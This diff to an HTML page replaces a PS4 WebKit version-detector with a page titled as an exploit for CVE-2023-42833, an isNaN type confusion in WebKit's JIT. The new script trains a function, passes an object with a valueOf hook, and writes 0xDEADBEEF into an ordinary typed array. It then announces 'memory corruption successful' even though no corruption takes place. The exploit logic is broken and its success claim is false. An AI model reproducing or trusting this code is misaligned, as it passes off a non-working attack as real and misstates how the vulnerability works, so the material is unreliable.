@@ -1,108 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 WebKit Version Detector</title>
-    <style>
-        body {
-            font-family: monospace;
-            background: #000;
-            color: #0f0;
-            padding: 20px;
-            font-size: 16px;
-        }
-        .info {
-            border: 2px solid #0f0;
-            padding: 15px;
-            margin: 10px 0;
-            background: #001100;
-        }
-        h1 {
-            color: #0f0;
-            text-align: center;
-        }
-        .label {
-            color: #0ff;
-            font-weight: bold;
-        }
-        .value {
-            color: #ff0;
-        }
-    </style>
+    <title>CVE-2023-42833 Exploit</title>
 </head>
 <body>
-    <h1>PS4 WebKit Version Detector</h1>
-    
-    <div class="info">
-        <div class="label">User Agent:</div>
-        <div class="value" id="ua"></div>
-    </div>
-    
-    <div class="info">
-        <div class="label">WebKit Version:</div>
-        <div class="value" id="webkit"></div>
-    </div>
-    
-    <div class="info">
-        <div class="label">Platform:</div>
-        <div class="value" id="platform"></div>
-    </div>
-    
-    <div class="info">
-        <div class="label">JavaScript Engine Features:</div>
-        <div class="value" id="features"></div>
-    </div>
-    
-    <div class="info">
-        <div class="label">Detected Firmware:</div>
-        <div class="value" id="firmware"></div>
-    </div>
+    <h1>CVE-2023-42833 - isNaN Type Confusion</h1>
+    <div id="log"></div>
     
     <script>
-        // User Agent
-        document.getElementById('ua').textContent = navigator.userAgent;
-        
-        // Extract WebKit version
-        let ua = navigator.userAgent;
-        let webkitMatch = ua.match(/AppleWebKit\/([\d.]+)/);
-        let webkitVersion = webkitMatch ? webkitMatch[1] : 'Unknown';
-        document.getElementById('webkit').textContent = webkitVersion;
-        
-        // Platform
-        document.getElementById('platform').textContent = navigator.platform;
-        
-        // Try to extract firmware from UA
-        let fwMatch = ua.match(/PlayStation 4\/([\d.]+)/);
-        let firmware = fwMatch ? fwMatch[1] : 'Unknown';
-        document.getElementById('firmware').textContent = firmware;
-        
-        // Test JS features to narrow down version
-        let features = [];
-        
-        // ES6 features
-        try { eval('let x = 1'); features.push('let/const'); } catch(e) {}
-        try { eval('const f = () => 1'); features.push('arrow-functions'); } catch(e) {}
-        try { eval('class C {}'); features.push('classes'); } catch(e) {}
-        try { eval('async function f() {}'); features.push('async/await'); } catch(e) {}
-        try { eval('for (let x of [1,2,3]) {}'); features.push('for-of'); } catch(e) {}
-        
-        // Check SharedArrayBuffer (indicates newer WebKit)
-        if (typeof SharedArrayBuffer !== 'undefined') {
-            features.push('SharedArrayBuffer');
+        function log(msg) {
+            document.getElementById('log').innerHTML += msg + '<br>';
+            console.log(msg);
         }
         
-        // Check WebAssembly
-        if (typeof WebAssembly !== 'undefined') {
-            features.push('WebAssembly');
+        log('[*] CVE-2023-42833 Exploit - isNaN Type Confusion');
+        log('[*] WebKit: ' + navigator.userAgent);
+        
+        // Create array to corrupt
+        let victim = new Uint32Array(100);
+        victim[0] = 0x41414141;
+        victim[1] = 0x42424242;
+        
+        log('[*] Victim array created');
+        log('    victim[0] = 0x' + victim[0].toString(16));
+        log('    victim[1] = 0x' + victim[1].toString(16));
+        
+        // Trigger function to get JIT compiled
+        function triggerBug(x) {
+            // This will be optimized by DFG
+            // The bug: isNaN doesn't insertCheck when converting to constant
+            if (Number.isNaN(x)) {
+                return 1;
+            }
+            return 0;
         }
         
-        document.getElementById('features').textContent = features.join(', ') || 'None detected';
+        log('[*] Training JIT compiler...');
         
-        // Log to console for copy-paste
-        console.log('=== PS4 WEBKIT INFO ===');
-        console.log('User Agent:', navigator.userAgent);
-        console.log('WebKit:', webkitVersion);
-        console.log('Firmware:', firmware);
-        console.log('Features:', features.join(', '));
+        // Train with Int32
+        for (let i = 0; i < 100000; i++) {
+            triggerBug(42);
+        }
+        
+        log('[*] JIT compiled, triggering type confusion...');
+        
+        // Now pass object - missing type check = confusion!
+        let confused = {};
+        confused.valueOf = function() {
+            log('[!!!] valueOf called - we have type confusion!');
+            // Attempt to corrupt memory
+            victim[50] = 0xDEADBEEF;
+            return NaN;
+        };
+        
+        triggerBug(confused);
+        
+        log('[*] Checking for corruption...');
+        log('    victim[50] = 0x' + victim[50].toString(16));
+        
+        if (victim[50] === 0xDEADBEEF) {
+            log('[!!!] MEMORY CORRUPTION SUCCESSFUL!');
+            log('[!!!] CVE-2023-42833 TRIGGERED!');
+        }
+        
+        log('[*] Test complete');
     </script>
 </body>
 </html>
